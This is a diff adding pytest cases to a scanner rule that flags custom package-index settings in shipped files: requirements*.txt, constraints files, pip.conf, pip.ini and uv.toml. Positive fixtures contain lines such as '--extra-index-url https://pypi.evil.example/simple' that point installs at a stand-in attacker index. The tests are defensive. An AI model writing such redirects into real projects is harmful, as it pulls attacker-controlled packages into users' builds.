@@ -307,3 +307,43 @@ def test_custom_index_env_in_python():
 ])
 def test_custom_index_negatives(text):
     assert not [f for f in run_static_rules([ScanFile("setup.sh", text)], []) if f.rule == "install.custom-index"], text
+
+
+# ------------------------------------------------------------------ fix round 4 (M13): config-file channels
+
+def _ci(rel: str, text: str) -> list:
+    return [f for f in run_static_rules([ScanFile(rel, text)], []) if f.rule == "install.custom-index"]
+
+
+@pytest.mark.parametrize("rel,text", [
+    ("requirements.txt", "requests==2.32.3\n--extra-index-url https://pypi.evil.example/simple\n"),
+    ("requirements-dev.txt", "--index-url=https://evil.example/simple\nx\n"),
+    ("requirements.txt", "-i https://10.0.0.5/simple\nx\n"),
+    ("sub/constraints.txt", "  --find-links https://evil.example/wheels\n"),
+    ("requirements/base.txt", "x\n"),  # not a requirements*.txt name: see the negatives
+    ("pip.conf", "[global]\nindex-url = https://evil.example/simple\n"),
+    ("cfg/pip.ini", "[global]\nextra-index-url =\n    https://pypi.org/simple\n    https://evil.example/simple\n"),
+    ("uv.toml", 'index-url = "https://evil.example/simple"\n'),
+    ("uv.toml", 'extra-index-url = [\n  "https://evil.example/simple",\n]\n'),
+])
+def test_custom_index_in_shipped_config_files(rel, text):
+    got = _ci(rel, text)
+    if rel == "requirements/base.txt":
+        assert not got
+        return
+    assert got and got[0].severity == Severity.MED and got[0].file == rel, (rel, text)
+
+
+@pytest.mark.parametrize("rel,text", [
+    ("requirements.txt", "--index-url https://pypi.org/simple\n--extra-index-url https://files.pythonhosted.org/x\n"),
+    ("requirements.txt", "requests  # see https://evil.example/docs\n-r other.txt\n-f ./wheels\n"),
+    ("requirements.txt", "# --extra-index-url https://evil.example/simple\n"),
+    ("constraints.txt", "x<2\n"),
+    ("pip.conf", "[global]\nindex-url = https://pypi.org/simple\ntimeout = 60\n"),
+    ("pip.conf", "[global]\n# index-url = https://evil.example/simple\n"),
+    ("uv.toml", 'index-url = "https://pypi.org/simple"\n[pip]\nnote = "https://evil.example/x"\n'),
+    ("notes.txt", "--extra-index-url https://evil.example/simple\n"),  # not a requirements file
+    ("settings.toml", 'index-url = "https://evil.example/simple"\n'),  # not uv.toml
+])
+def test_custom_index_config_negatives(rel, text):
+    assert not _ci(rel, text), (rel, text)
